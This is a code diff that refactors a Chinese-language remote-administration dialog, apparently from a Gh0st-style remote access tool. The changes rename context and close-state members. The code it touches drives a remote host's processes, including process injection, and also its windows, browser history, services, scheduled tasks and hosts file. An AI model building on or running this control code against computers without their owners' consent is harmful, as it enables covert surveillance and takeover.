@@ -24,14 +24,9 @@ static UINT indicators[] = {
 
 
 CMachineDlg::CMachineDlg(CWnd* pParent, ISocketBase* pIOCPServer, ClientContext* pContext)
-    : DialogBase(CMachineDlg::IDD, pParent, pIOCPServer, pContext, 0)
+    : DialogBase(CMachineDlg::IDD, pParent, pIOCPServer, pContext, IDI_MACHINE)
 {
     m_pMainWnd = (CMy2015RemoteDlg*)pParent;
-    m_iocpServer = pIOCPServer;
-    m_pContext = pContext;
-    m_hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_MACHINE));
-
-    m_bOnClose = false;
 
     m_nSortedCol = 1;
     m_bAscending = true;
@@ -40,7 +35,7 @@ CMachineDlg::CMachineDlg(CWnd* pParent, ISocketBase* pIOCPServer, ClientContext*
 }
 
 CMachineDlg::~CMachineDlg() {
-    m_bOnClose = TRUE;
+    m_bIsClosed = TRUE;
     SAFE_DELETE(m_IPConverter);
     DeleteList();
 }
@@ -132,7 +127,7 @@ BOOL CMachineDlg::OnInitDialog()
 
     // TODO: Add extra initialization here
     CString str;
-    str.Format(_T("主机管理 - %s"), m_pContext->PeerName.c_str());
+    str.Format(_T("主机管理 - %s"), m_ContextObject->PeerName.c_str());
     SetWindowText(str);
 
     m_tab.SetPadding(CSize(6, 3));
@@ -168,7 +163,7 @@ BOOL CMachineDlg::OnInitDialog()
 
     AdjustList();
     BYTE lpBuffer = COMMAND_MACHINE_PROCESS;
-    m_iocpServer->Send(m_pContext, (LPBYTE)&lpBuffer, 1);
+    m_iocpServer->Send(m_ContextObject, (LPBYTE)&lpBuffer, 1);
 
     return TRUE;
 }
@@ -209,11 +204,11 @@ void CMachineDlg::OnReceive()
 
 void CMachineDlg::OnReceiveComplete()
 {
-    if (m_bOnClose) return;
+    if (m_bIsClosed) return;
     SetReceivingStatus(true);
 
-    if (TOKEN_MACHINE_MSG == m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0]) {
-        CString strResult = (char*)m_pContext->m_DeCompressionBuffer.GetBuffer(1);
+    if (TOKEN_MACHINE_MSG == m_ContextObject->m_DeCompressionBuffer.GetBuffer(0)[0]) {
+        CString strResult = (char*)m_ContextObject->m_DeCompressionBuffer.GetBuffer(1);
         PostMessage(WM_SHOW_MSG, (WPARAM)new CString(strResult), 0);
         SetReceivingStatus(false);
         return;
@@ -221,14 +216,14 @@ void CMachineDlg::OnReceiveComplete()
 
     DeleteList();
 
-    if (m_pContext->m_DeCompressionBuffer.GetBufferLen() <= 2) {
+    if (m_ContextObject->m_DeCompressionBuffer.GetBufferLen() <= 2) {
         PostMessage(WM_SHOW_MSG, (WPARAM)new CString(_T("无权限或无记录...")), 0);
         SetReceivingStatus(false);
         return;
     }
 
     PostMessage(WM_WAIT_MSG, TRUE, 0);
-    switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0]) {
+    switch (m_ContextObject->m_DeCompressionBuffer.GetBuffer(0)[0]) {
     case TOKEN_MACHINE_PROCESS:
         ShowProcessList();
         break;
@@ -324,9 +319,11 @@ void CMachineDlg::OnRclickList(NMHDR* pNMHDR, LRESULT* pResult)
 
 void CMachineDlg::OnClose()
 {
-    m_bOnClose = TRUE;
-	m_ContextObject->CancelIO();
+	CancelIO();
 	DeleteList();
+    if (m_wndStatusBar.GetSafeHwnd())
+        m_wndStatusBar.DestroyWindow();
+    SAFE_DELETE(m_IPConverter);
 	CDialogBase::OnClose();
 }
 
@@ -335,7 +332,7 @@ void CMachineDlg::reflush()
     int nID = m_tab.GetCurSel();
     DeleteList();
     BYTE TOKEN = MachineManager(nID);
-    m_iocpServer->Send(m_pContext, (LPBYTE)&TOKEN, 1);
+    m_iocpServer->Send(m_ContextObject, (LPBYTE)&TOKEN, 1);
 }
 
 
@@ -370,7 +367,8 @@ LRESULT CMachineDlg::OnWaitMessage(WPARAM wParam, LPARAM lParam)
 
 void CMachineDlg::DeleteList()
 {
-    if (!m_list) return;
+    if (!m_list.GetSafeHwnd()) return;
+
     for (int i=0, n=m_list.GetItemCount(); i<n; ++i){
         ListItem* item = (ListItem*)m_list.GetItemData(i);
         if(item) item->Destroy();
@@ -381,7 +379,7 @@ void CMachineDlg::DeleteList()
     for (int n = 0; n < nColumnCount; n++) {
         m_list.DeleteColumn(0);
     }
-    if (!m_bOnClose)
+    if (!m_bIsClosed)
         PostMessage(WM_SHOW_MSG, (WPARAM)new CString(_T("请等待数据返回...")), 0);
 }
 
@@ -398,11 +396,11 @@ void CMachineDlg::ShowProcessList()
     m_list.InsertColumn(8, _T("窗口名称"), LVCFMT_LEFT, 100);
     m_list.InsertColumn(9, _T("进程位数"), LVCFMT_LEFT, 80);
 
-    char* lpBuffer = (char*)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
+    char* lpBuffer = (char*)(m_ContextObject->m_DeCompressionBuffer.GetBuffer(1));
     DWORD	dwOffset = 0;
     CString str;
     int i = 0;
-    for (i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++) {
+    for (i = 0; dwOffset < m_ContextObject->m_DeCompressionBuffer.GetBufferLen() - 1; i++) {
         LPDWORD	lpPID = LPDWORD(lpBuffer + dwOffset);
         bool* is64 = (bool*)(lpBuffer + dwOffset + sizeof(DWORD));
         char* szBuf_title = (char*)(lpBuffer + dwOffset + sizeof(DWORD) + sizeof(bool));
@@ -464,12 +462,12 @@ void CMachineDlg::ShowWindowsList()
     m_list.InsertColumn(3, _T("窗口状态"), LVCFMT_LEFT, 100);
     m_list.InsertColumn(4, _T("大小"), LVCFMT_LEFT, 100);
 
-    LPBYTE lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
+    LPBYTE lpBuffer = (LPBYTE)(m_ContextObject->m_DeCompressionBuffer.GetBuffer(1));
     DWORD	dwOffset = 0;
     CString	str;
     int i;
     WINDOWSINFO m_ibfo;
-    for (i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++) {
+    for (i = 0; dwOffset < m_ContextObject->m_DeCompressionBuffer.GetBufferLen() - 1; i++) {
         memcpy(&m_ibfo, lpBuffer + dwOffset, sizeof(WINDOWSINFO));
 
         str.Format(_T("%5u"), m_ibfo.m_poceessid);
@@ -506,10 +504,10 @@ void CMachineDlg::ShowNetStateList()
     m_list.InsertColumn(5, _T("目标IP归属地"), LVCFMT_LEFT, 140);
     m_list.InsertColumn(6, _T("连接状态"), LVCFMT_LEFT, 80);
 
-    LPBYTE	lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
+    LPBYTE	lpBuffer = (LPBYTE)(m_ContextObject->m_DeCompressionBuffer.GetBuffer(1));
     DWORD	dwOffset = 0;
     CString str, IPAddress;
-    for (int i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++) {
+    for (int i = 0; dwOffset < m_ContextObject->m_DeCompressionBuffer.GetBufferLen() - 1; i++) {
         int pid = 0;
         for (int j = 0; j < 7; j++) {
             if (j == 0) {
@@ -556,9 +554,9 @@ void CMachineDlg::ShowSoftWareList()
     m_list.InsertColumn(3, _T("安装时间"), LVCFMT_LEFT, 80);
     m_list.InsertColumn(4, _T("卸载命令及参数"), LVCFMT_LEFT, 400);
 
-    LPBYTE	lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
+    LPBYTE	lpBuffer = (LPBYTE)(m_ContextObject->m_DeCompressionBuffer.GetBuffer(1));
     DWORD	dwOffset = 0;
-    for (int i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++) {
+    for (int i = 0; dwOffset < m_ContextObject->m_DeCompressionBuffer.GetBufferLen() - 1; i++) {
         for (int j = 0; j < 5; j++) {
             char* lpString = (char*)(lpBuffer + dwOffset);
             if (j == 0)
@@ -579,10 +577,10 @@ void CMachineDlg::ShowIEHistoryList()
     m_list.InsertColumn(1, _T("访问时间"), LVCFMT_LEFT, 130);
     m_list.InsertColumn(2, _T("标题"), LVCFMT_LEFT, 150);
     m_list.InsertColumn(3, _T("网页地址"), LVCFMT_LEFT, 400);
-    LPBYTE	lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
+    LPBYTE	lpBuffer = (LPBYTE)(m_ContextObject->m_DeCompressionBuffer.GetBuffer(1));
     DWORD	dwOffset = 0;
     CString	str;
-    for (int i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++) {
+    for (int i = 0; dwOffset < m_ContextObject->m_DeCompressionBuffer.GetBufferLen() - 1; i++) {
         Browsinghistory* p_Browsinghistory = (Browsinghistory*)((char*)lpBuffer + dwOffset);
         str.Format(_T("%d"), i);
         m_list.InsertItem(i, str, 0);
@@ -600,9 +598,9 @@ void CMachineDlg::ShowFavoritesUrlList()
     m_list.InsertColumn(0, _T("收藏名称"), LVCFMT_LEFT, 200);
     m_list.InsertColumn(1, _T("Url"), LVCFMT_LEFT, 300);
 
-    LPBYTE	lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
+    LPBYTE	lpBuffer = (LPBYTE)(m_ContextObject->m_DeCompressionBuffer.GetBuffer(1));
     DWORD	dwOffset = 0;
-    for (int i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++) {
+    for (int i = 0; dwOffset < m_ContextObject->m_DeCompressionBuffer.GetBufferLen() - 1; i++) {
         for (int j = 0; j < 2; j++) {
             char* lpString = (char*)((char*)lpBuffer + dwOffset);
             if (j == 0)
@@ -628,10 +626,10 @@ void CMachineDlg::ShowServiceList()
     m_list.InsertColumn(6, _T("服务名"), LVCFMT_LEFT, 140);
     m_list.InsertColumn(7, _T("可执行文件路径"), LVCFMT_LEFT, 400);
 
-    char* lpBuffer = (char*)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
+    char* lpBuffer = (char*)(m_ContextObject->m_DeCompressionBuffer.GetBuffer(1));
     DWORD	dwOffset = 0;
     int i = 0;
-    for (i = 0; dwOffset < (m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1) / sizeof(char); i++) {
+    for (i = 0; dwOffset < (m_ContextObject->m_DeCompressionBuffer.GetBufferLen() - 1) / sizeof(char); i++) {
         char* DisplayName = lpBuffer + dwOffset;
         char* Describe = DisplayName + lstrlen(DisplayName) + 1;
         char* serRunway = Describe + lstrlen(Describe) + 1;
@@ -673,12 +671,12 @@ void CMachineDlg::ShowTaskList()
     m_list.InsertColumn(5, _T("最后执行时间"), LVCFMT_LEFT, 130);
     m_list.InsertColumn(6, _T("下次执行时间"), LVCFMT_LEFT, 130);
 
-    BYTE* lpBuffer = (BYTE*)(m_pContext->m_DeCompressionBuffer.GetBuffer() + 1);
+    BYTE* lpBuffer = (BYTE*)(m_ContextObject->m_DeCompressionBuffer.GetBuffer() + 1);
     DATE lasttime = 0;
     DATE nexttime = 0;
     DWORD	dwOffset = 0;
     CString str;
-    for (int i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++) {
+    for (int i = 0; dwOffset < m_ContextObject->m_DeCompressionBuffer.GetBufferLen() - 1; i++) {
         char* taskname = (char*)(lpBuffer + dwOffset);
         char* taskpath = taskname + lstrlen(taskname) + 1;
         char* exepath = taskpath + lstrlen(taskpath) + 1;
@@ -716,7 +714,7 @@ void CMachineDlg::ShowHostsList()
 {
     m_list.InsertColumn(0, _T("数据"), LVCFMT_LEFT, 600);
 
-    LPBYTE	lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
+    LPBYTE	lpBuffer = (LPBYTE)(m_ContextObject->m_DeCompressionBuffer.GetBuffer(1));
     int i = 0;
     char* buf;
     char* lpString = (char*)lpBuffer;
@@ -772,7 +770,7 @@ void CMachineDlg::OpenInfoDlg()
     CServiceInfoDlg pDlg(this);
 
     pDlg.m_iocpServer = m_iocpServer;
-    pDlg.m_pContext = m_pContext;
+    pDlg.m_ContextObject = m_ContextObject;
 
     pDlg.m_ServiceInfo.strSerName = m_list.GetItemText(nItem, 6);
     pDlg.m_ServiceInfo.strSerDisPlayname = m_list.GetItemText(nItem, 0);
@@ -801,7 +799,7 @@ void CMachineDlg::SendToken(BYTE bToken)
     lpBuffer[0] = bToken;
 
     memcpy(lpBuffer + 1, tSerName.GetBuffer(0), tSerName.GetLength() * sizeof(char));
-    m_iocpServer->Send(m_pContext, lpBuffer, nPacketLength);
+    m_iocpServer->Send(m_ContextObject, lpBuffer, nPacketLength);
     LocalFree(lpBuffer);
 }
 
@@ -879,7 +877,7 @@ void CMachineDlg::ShowProcessList_menu()
             lpBuffer[0] = COMMAND_PROCESS_KILLDEL;
             DWORD dwProcessID = ((ListItem*)m_list.GetItemData(nItem))->pid;
             memcpy(lpBuffer + 1, &dwProcessID, sizeof(DWORD));
-            m_iocpServer->Send(m_pContext, lpBuffer, sizeof(DWORD) + 1);
+            m_iocpServer->Send(m_ContextObject, lpBuffer, sizeof(DWORD) + 1);
             SAFE_DELETE_AR(lpBuffer);
         }
     }
@@ -892,7 +890,7 @@ void CMachineDlg::ShowProcessList_menu()
             lpBuffer[0] = COMMAND_PROCESS_KILL;
             DWORD dwProcessID = ((ListItem*)m_list.GetItemData(nItem))->pid;
             memcpy(lpBuffer + 1, &dwProcessID, sizeof(DWORD));
-            m_iocpServer->Send(m_pContext, lpBuffer, sizeof(DWORD) + 1);
+            m_iocpServer->Send(m_ContextObject, lpBuffer, sizeof(DWORD) + 1);
             SAFE_DELETE_AR(lpBuffer);
         }
     }
@@ -905,7 +903,7 @@ void CMachineDlg::ShowProcessList_menu()
             lpBuffer[0] = COMMAND_PROCESS_FREEZING;
             DWORD dwProcessID = ((ListItem*)m_list.GetItemData(nItem))->pid;
             memcpy(lpBuffer + 1, &dwProcessID, sizeof(DWORD));
-            m_iocpServer->Send(m_pContext, lpBuffer, sizeof(DWORD) + 1);
+            m_iocpServer->Send(m_ContextObject, lpBuffer, sizeof(DWORD) + 1);
             SAFE_DELETE_AR(lpBuffer);
         }
     }
@@ -918,7 +916,7 @@ void CMachineDlg::ShowProcessList_menu()
             lpBuffer[0] = COMMAND_PROCESS_THAW;
             DWORD dwProcessID = ((ListItem*)m_list.GetItemData(nItem))->pid;
             memcpy(lpBuffer + 1, &dwProcessID, sizeof(DWORD));
-            m_iocpServer->Send(m_pContext, lpBuffer, sizeof(DWORD) + 1);
+            m_iocpServer->Send(m_ContextObject, lpBuffer, sizeof(DWORD) + 1);
             SAFE_DELETE_AR(lpBuffer);
         }
     }
@@ -931,7 +929,7 @@ void CMachineDlg::ShowProcessList_menu()
             lpBuffer[0] = COMMAND_PROCESS_DEL;
             DWORD dwProcessID = ((ListItem*)m_list.GetItemData(nItem))->pid;
             memcpy(lpBuffer + 1, &dwProcessID, sizeof(DWORD));
-            m_iocpServer->Send(m_pContext, lpBuffer, sizeof(DWORD) + 1);
+            m_iocpServer->Send(m_ContextObject, lpBuffer, sizeof(DWORD) + 1);
             SAFE_DELETE_AR(lpBuffer);
         }
     }
@@ -968,7 +966,7 @@ void CMachineDlg::ShowProcessList_menu()
                 DWORD wr = 0;
                 ReadFile(hFile, lpBuffer + sizeof(InjectData)+1, p_InjectData->datasize, &wr, NULL);
                 CloseHandle(hFile);
-                m_iocpServer->Send(m_pContext, lpBuffer, allsize);
+                m_iocpServer->Send(m_ContextObject, lpBuffer, allsize);
                 SAFE_DELETE_AR(lpBuffer);
             }
             SAFE_DELETE(p_InjectData);
@@ -1042,7 +1040,7 @@ void CMachineDlg::ShowWindowsList_menu()
             memcpy(lpMsgBuf + 1, &hwnd, sizeof(DWORD));
             DWORD dHow = SW_RESTORE;
             memcpy(lpMsgBuf + 1 + sizeof(hwnd), &dHow, sizeof(DWORD));
-            m_iocpServer->Send(m_pContext, lpMsgBuf, sizeof(lpMsgBuf));
+            m_iocpServer->Send(m_ContextObject, lpMsgBuf, sizeof(lpMsgBuf));
         }
     }
     break;
@@ -1057,7 +1055,7 @@ void CMachineDlg::ShowWindowsList_menu()
             memcpy(lpMsgBuf + 1, &hwnd, sizeof(DWORD));
             DWORD dHow = SW_HIDE;
             memcpy(lpMsgBuf + 1 + sizeof(hwnd), &dHow, sizeof(DWORD));
-            m_iocpServer->Send(m_pContext, lpMsgBuf, sizeof(lpMsgBuf));
+            m_iocpServer->Send(m_ContextObject, lpMsgBuf, sizeof(lpMsgBuf));
         }
     }
     break;
@@ -1071,7 +1069,7 @@ void CMachineDlg::ShowWindowsList_menu()
             DWORD hwnd = _tstoi(m_list.GetItemText(nItem, 1));
             m_list.SetItemText(nItem, 3, _T("发送关闭命令"));
             memcpy(lpMsgBuf + 1, &hwnd, sizeof(DWORD));
-            m_iocpServer->Send(m_pContext, lpMsgBuf, sizeof(lpMsgBuf));
+            m_iocpServer->Send(m_ContextObject, lpMsgBuf, sizeof(lpMsgBuf));
         }
     }
     break;
@@ -1086,7 +1084,7 @@ void CMachineDlg::ShowWindowsList_menu()
             memcpy(lpMsgBuf + 1, &hwnd, sizeof(DWORD));
             DWORD dHow = SW_MAXIMIZE;
             memcpy(lpMsgBuf + 1 + sizeof(hwnd), &dHow, sizeof(DWORD));
-            m_iocpServer->Send(m_pContext, lpMsgBuf, sizeof(lpMsgBuf));
+            m_iocpServer->Send(m_ContextObject, lpMsgBuf, sizeof(lpMsgBuf));
         }
     }
     break;
@@ -1101,7 +1099,7 @@ void CMachineDlg::ShowWindowsList_menu()
             memcpy(lpMsgBuf + 1, &hwnd, sizeof(DWORD));
             DWORD dHow = SW_MINIMIZE;
             memcpy(lpMsgBuf + 1 + sizeof(hwnd), &dHow, sizeof(DWORD));
-            m_iocpServer->Send(m_pContext, lpMsgBuf, sizeof(lpMsgBuf));
+            m_iocpServer->Send(m_ContextObject, lpMsgBuf, sizeof(lpMsgBuf));
         }
     }
     break;
@@ -1115,7 +1113,7 @@ void CMachineDlg::ShowWindowsList_menu()
             pid = m_list.GetItemText(nItem, 0);
             DWORD	dwProcessID = _tstoi(pid);
             memcpy(lpBuffer + 1, &dwProcessID, sizeof(DWORD));
-            m_iocpServer->Send(m_pContext, lpBuffer, sizeof(DWORD) + 1);
+            m_iocpServer->Send(m_ContextObject, lpBuffer, sizeof(DWORD) + 1);
             SAFE_DELETE_AR(lpBuffer);
         }
     }
@@ -1130,7 +1128,7 @@ void CMachineDlg::ShowWindowsList_menu()
             pid = m_list.GetItemText(nItem, 0);
             DWORD	dwProcessID = _tstoi(pid);
             memcpy(lpBuffer + 1, &dwProcessID, sizeof(DWORD));
-            m_iocpServer->Send(m_pContext, lpBuffer, sizeof(DWORD) + 1);
+            m_iocpServer->Send(m_ContextObject, lpBuffer, sizeof(DWORD) + 1);
             SAFE_DELETE_AR(lpBuffer);
         }
     }
@@ -1145,7 +1143,7 @@ void CMachineDlg::ShowWindowsList_menu()
             pid = m_list.GetItemText(nItem, 0);
             DWORD	dwProcessID = _tstoi(pid);
             memcpy(lpBuffer + 1, &dwProcessID, sizeof(DWORD));
-            m_iocpServer->Send(m_pContext, lpBuffer, sizeof(DWORD) + 1);
+            m_iocpServer->Send(m_ContextObject, lpBuffer, sizeof(DWORD) + 1);
             SAFE_DELETE_AR(lpBuffer);
         }
     }
@@ -1202,7 +1200,7 @@ void CMachineDlg::ShowNetStateList_menu()
             lpBuffer[0] = COMMAND_PROCESS_KILL;
             DWORD dwProcessID = ((ListItem*)m_list.GetItemData(nItem))->pid;
             memcpy(lpBuffer + 1, &dwProcessID, sizeof(DWORD));
-            m_iocpServer->Send(m_pContext, lpBuffer, sizeof(DWORD) + 1);
+            m_iocpServer->Send(m_ContextObject, lpBuffer, sizeof(DWORD) + 1);
             SAFE_DELETE_AR(lpBuffer);
         }
     }
@@ -1271,7 +1269,7 @@ void CMachineDlg::ShowSoftWareList_menu()
                 LPBYTE lpBuffer = new BYTE[1 + str_a.GetLength()];
                 lpBuffer[0] = COMMAND_APPUNINSTALL;
                 memcpy(lpBuffer + 1, str_a.GetBuffer(0), str_a.GetLength());
-                m_iocpServer->Send(m_pContext, lpBuffer, str_a.GetLength() + 1);
+                m_iocpServer->Send(m_ContextObject, lpBuffer, str_a.GetLength() + 1);
                 SAFE_DELETE_AR(lpBuffer);
             }
         }
@@ -1367,7 +1365,7 @@ void CMachineDlg::ShowTaskList_menu()
         memcpy(lpBuffer + offset, taskname.GetBuffer(), lstrlen(taskname.GetBuffer()) * 2 + 2);
         offset += lstrlen(taskname.GetBuffer()) * 2 + 2;
 
-        m_iocpServer->Send(m_pContext, lpBuffer, nPacketLength);
+        m_iocpServer->Send(m_ContextObject, lpBuffer, nPacketLength);
 
         LocalFree(lpBuffer);
     }
@@ -1395,7 +1393,7 @@ void CMachineDlg::ShowTaskList_menu()
         memcpy(lpBuffer + offset, taskname.GetBuffer(), lstrlen(taskname.GetBuffer()) * 2 + 2);
         offset += lstrlen(taskname.GetBuffer()) * 2 + 2;
 
-        m_iocpServer->Send(m_pContext, lpBuffer, nPacketLength);
+        m_iocpServer->Send(m_ContextObject, lpBuffer, nPacketLength);
 
         LocalFree(lpBuffer);
     }
@@ -1423,7 +1421,7 @@ void CMachineDlg::ShowTaskList_menu()
         memcpy(lpBuffer + offset, taskname.GetBuffer(), lstrlen(taskname.GetBuffer()) * 2 + 2);
         offset += lstrlen(taskname.GetBuffer()) * 2 + 2;
 
-        m_iocpServer->Send(m_pContext, lpBuffer, nPacketLength);
+        m_iocpServer->Send(m_ContextObject, lpBuffer, nPacketLength);
 
         LocalFree(lpBuffer);
     }
@@ -1455,7 +1453,7 @@ void CMachineDlg::ShowTaskList_menu()
 
                 memcpy(lpBuffer + offset, dlg->m_Description.GetBuffer(), lstrlen(dlg->m_Description.GetBuffer()) * 2 + 2);
                 offset += lstrlen(dlg->m_Description.GetBuffer()) * 2 + 2;
-                m_iocpServer->Send(m_pContext, lpBuffer, len);
+                m_iocpServer->Send(m_ContextObject, lpBuffer, len);
 
                 LocalFree(lpBuffer);
             }
@@ -1466,7 +1464,7 @@ void CMachineDlg::ShowTaskList_menu()
     break;
     case 104: {
         BYTE bToken = COMMAND_MACHINE_TASK;
-        m_iocpServer->Send(m_pContext, &bToken, 1);
+        m_iocpServer->Send(m_ContextObject, &bToken, 1);
     }
     break;
     }
@@ -1561,7 +1559,7 @@ void CMachineDlg::ShowServiceList_menu()
             bToken = COMMAND_SERVICE_LIST_WIN32;
         else
             bToken = COMMAND_SERVICE_LIST_DRIVER;
-        m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
+        m_iocpServer->Send(m_ContextObject, &bToken, sizeof(BYTE));
     }
     break;
     case 700:
@@ -1631,7 +1629,7 @@ void CMachineDlg::ShowHostsList_menu()
         LPBYTE lpBuffer = new BYTE[1 + Data_a.GetLength()];
         lpBuffer[0] = COMMAND_HOSTS_SET;
         memcpy(lpBuffer + 1, Data_a.GetBuffer(0), Data_a.GetLength());
-        m_iocpServer->Send(m_pContext, lpBuffer, Data_a.GetLength() + 1);
+        m_iocpServer->Send(m_ContextObject, lpBuffer, Data_a.GetLength() + 1);
         SAFE_DELETE_AR(lpBuffer);
     }
     break;
